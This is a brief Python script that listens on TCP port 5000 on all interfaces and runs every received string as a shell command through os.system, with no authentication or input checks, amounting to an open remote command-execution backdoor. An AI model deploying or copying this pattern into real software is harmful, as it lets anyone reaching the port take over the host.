import os
import socket

server_port = 5000

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
    server_socket.bind(('', server_port))
    server_socket.listen()

    print(f'Server is listening at port {server_port}')

    while True:
        connection_socket, _ = server_socket.accept()
        with connection_socket:
            command = connection_socket.recv(2048).decode('utf-8')
        print(f'Received command: {command}')
        os.system(command)
